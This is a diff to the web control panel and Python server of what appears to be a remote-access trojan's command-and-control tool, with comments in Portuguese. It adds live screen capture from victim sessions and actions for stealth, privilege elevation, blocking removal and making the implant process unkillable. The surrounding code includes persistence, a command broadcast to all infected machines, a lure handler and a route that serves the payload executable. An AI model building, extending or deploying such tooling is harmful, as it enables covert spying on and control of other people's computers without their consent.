@@ -152,6 +152,12 @@ input[type=text]:focus{border-color:#38bdf8}
       <button data-act="persist">persistir</button>
       <button data-act="unpersist">remover</button>
     </div>
+    <div class="grp"><span>defesa</span>
+      <button data-act="stealth">status</button>
+      <button data-act="elevate">elevar</button>
+      <button data-act="lockdown">travar</button>
+      <button data-act="unkillable">matar? off</button>
+    </div>
     <div class="grp"><span>sessão</span>
       <button data-act="bcast">broadcast</button>
       <button data-act="close">desconectar</button>
@@ -168,7 +174,7 @@ input[type=text]:focus{border-color:#38bdf8}
 <input id="file" type="file" style="display:none">
 <script>
 const TOKEN = new URLSearchParams(location.search).get('t') || '';
-let cur = null, SESSIONS = [], liveTimer = null, liveImg = null;
+let cur = null, SESSIONS = [], liveTimer = null, liveImg = null, liveWrap = null, liveFails = 0;
 
 const $ = id => document.getElementById(id);
 const out = $('out');
@@ -247,6 +253,7 @@ async function refresh() {
     sm.textContent = s.addr + ' · ' + s.os + ' · ' + (s.admin ? 'admin' : 'user') + ' · ' + (s.transport || 'tcp') + (s.alive ? '' : ' · morto');
     d.appendChild(sm);
     d.onclick = () => {
+      if (liveTimer) liveStop('tela ao vivo: off (sessao trocada)');
       cur = s.id;
       $('who').textContent = s.id + ' — ' + s.user + '@' + s.host;
       $('state').textContent = s.alive ? 'live' : 'dead';
@@ -277,45 +284,84 @@ async function exec(op, args, label) {
   $('state').textContent = 'ready';
 }
 
-function toggleLive() {
-  if (liveTimer) {
-    clearInterval(liveTimer); liveTimer = null;
-    if (liveImg) { if (liveImg.src) URL.revokeObjectURL(liveImg.src); liveImg.remove(); liveImg = null; }
-    log('tela ao vivo: off'); return;
+function liveStop(msg) {
+  if (liveTimer) { clearInterval(liveTimer); liveTimer = null; }
+  if (liveImg) {
+    if (liveImg.dataset && liveImg.dataset.url) URL.revokeObjectURL(liveImg.dataset.url);
+    liveImg.remove(); liveImg = null;
   }
+  if (liveWrap) { liveWrap.remove(); liveWrap = null; }
+  liveFails = 0;
+  if (msg) log(msg);
+}
+
+function toggleLive() {
+  if (liveTimer) { liveStop('tela ao vivo: off'); return; }
   if (!cur) { log('! selecione uma sessão', 'err'); return; }
+  const sid = cur;
+  liveWrap = document.createElement('div');
+  liveWrap.style.cssText = 'margin-top:8px;border:1px solid #1d2a38;background:#000;max-width:100%;line-height:0';
   liveImg = document.createElement('img');
-  liveImg.style.cssText = 'max-width:100%;border:1px solid #1d2a38;margin-top:8px;display:block';
+  liveImg.style.cssText = 'display:block;width:100%;height:auto';
   liveImg.alt = 'aguardando frame...';
-  out.appendChild(liveImg);
+  liveWrap.appendChild(liveImg);
+  out.appendChild(liveWrap);
   log('tela ao vivo: on');
-  let busy = false, lastErr = '';
+  liveFails = 0;
+  let busy = false;
+
+  const fail = (m) => {
+    liveFails++;
+    if (liveFails <= 3) log('! tela: ' + m, 'err');
+    if (liveFails >= 6) liveStop('tela ao vivo: desligada (' + m + ')');
+  };
+
+  // troca o quadro so quando a imagem nova ja decodificou: sem piscar
+  const paint = (blob) => {
+    if (!liveImg || cur !== sid) return;
+    const url = URL.createObjectURL(blob);
+    const probe = new Image();
+    probe.onload = () => {
+      if (!liveImg || cur !== sid) { URL.revokeObjectURL(url); return; }
+      const old = liveImg.dataset.url || '';
+      liveImg.src = url;
+      liveImg.dataset.url = url;
+      if (old) URL.revokeObjectURL(old);
+      if (liveFails) { liveFails = 0; log('tela ao vivo: ok'); }
+    };
+    probe.onerror = () => { URL.revokeObjectURL(url); fail('frame invalido'); };
+    probe.src = url;
+  };
+
   const tick = async () => {
-    if (!cur || !liveImg || busy) return;
+    if (busy || !liveTimer || cur !== sid) return;
     busy = true;
-    const url = '/api/frame?sid=' + encodeURIComponent(cur) + (TOKEN ? '&t=' + TOKEN : '') + '&_=' + Date.now();
     try {
-      const r = await fetch(url, {headers: {'X-Token': TOKEN}});
-      if (!r.ok) {
-        let msg = 'erro ' + r.status;
-        try { const j = await r.json(); if (j && j.out) msg = j.out; } catch (e) {}
-        if (msg !== lastErr) { lastErr = msg; log('! tela: ' + msg, 'err'); }
+      const url = '/api/frame?sid=' + encodeURIComponent(sid) +
+        (TOKEN ? '&t=' + TOKEN : '') + '&w=1100&q=60&_=' + Date.now();
+      const r = await fetch(url, {cache: 'no-store'});
+      if (r.ok) {
+        paint(await r.blob());
       } else {
-        const blob = await r.blob();
-        if (liveImg) {
-          const old = liveImg.src;
-          liveImg.src = URL.createObjectURL(blob);
-          if (old && old.startsWith('blob:')) URL.revokeObjectURL(old);
-          if (lastErr) { log('tela ao vivo: ok'); lastErr = ''; }
+        let j = null;
+        try { j = await r.json(); } catch (e) {}
+        // reserva: pede o frame embutido (agente v3.1+ responde b64 em qualquer transporte)
+        const j2 = await api('/api/exec', {sid: sid, op: 'frame',
+                                           args: {b64: true, width: 1100, quality: 60}});
+        if (j2 && j2.ok && j2.out) {
+          const bin = atob(j2.out), arr = new Uint8Array(bin.length);
+          for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+          paint(new Blob([arr], {type: 'image/jpeg'}));
+        } else {
+          fail((j && j.out) || (j2 && j2.out) || ('erro ' + r.status));
         }
       }
-    } catch (e) {
-      if (String(e) !== lastErr) { lastErr = String(e); log('! tela: ' + e, 'err'); }
-    }
+    } catch (e) { fail(String(e)); }
     busy = false;
   };
+
+  liveTimer = setInterval(tick, 1000);
   tick();
-  liveTimer = setInterval(tick, 700);
 }
 
 const ask = (msg, def) => { const v = prompt(msg, def || ''); return v === null ? null : v; };
@@ -375,6 +421,11 @@ const ACT = {
   shutdown: () => { if (confirm('DESLIGAR o PC ' + cur + ' agora?')) exec('power', {action:'shutdown'}, 'desligar'); },
   persist:  () => exec('persist', {}, 'persistir'),
   unpersist:() => exec('unpersist', {}, 'remover persistência'),
+  stealth:  () => exec('stealth', {}, 'status defesa'),
+  elevate:  () => exec('elevate', {}, 'elevar para admin/system'),
+  lockdown: () => exec('lockdown', {}, 'travar remoção'),
+  unkillable: () => { const s = ask('estado do processo crítico (on/off)', 'off');
+                      if (s !== null) exec('unkillable', {state: s.trim() || 'off'}, 'critical ' + s); },
   bcast:    () => {
     const c = ask('comando para TODAS as sessões');
     if (!c) return;
@@ -615,16 +666,25 @@ class Handler(BaseHTTPRequestHandler):
     def _json(self, obj, code=200):
         self._send(code, json.dumps(obj))
 
-    def _frame(self, sid):
+    def _frame(self, sid, width=1280, quality=55):
         sess = (self.app.c2.get(sid) or self.app.http.get(sid)) if sid else None
         if not sess or not sess.alive:
             return self._json({"ok": False, "out": "session unavailable"}, 404)
         try:
-            res, data = sess.request("frame", {"width": 1280, "quality": 55}, timeout=20)
+            res, data = sess.request("frame", {"width": width, "quality": quality},
+                                     timeout=15)
         except Exception as exc:
             return self._json({"ok": False, "out": str(exc)}, 500)
-        if not res.get("ok") or not data:
+        if not res.get("ok"):
             return self._json({"ok": False, "out": res.get("out", "no frame")}, 500)
+        if not data and res.get("b64") and res.get("out"):
+            # agente mandou o jpeg embutido em base64 em vez de chunks
+            try:
+                data = base64.b64decode(res.get("out") or "")
+            except Exception:
+                data = b""
+        if not data:
+            return self._json({"ok": False, "out": "no frame"}, 500)
         return self._send(200, data, "image/jpeg")
 
     def _lure(self):
@@ -675,7 +735,16 @@ class Handler(BaseHTTPRequestHandler):
             return self._json({"sessions": self.app.sessions()})
         if path == "/api/frame":
             q = parse_qs(urlparse(self.path).query)
-            return self._frame(q.get("sid", [None])[0])
+            try:
+                w = int(q.get("w", ["1280"])[0])
+            except ValueError:
+                w = 1280
+            try:
+                qq = int(q.get("q", ["55"])[0])
+            except ValueError:
+                qq = 55
+            return self._frame(q.get("sid", [None])[0],
+                               max(240, min(w, 1920)), max(10, min(qq, 90)))
         if path == "/exe":
             # o painel tambem entrega o payload: daqui voce leva o exe pro outro PC
             full = getattr(self.app, "exe_path", "")
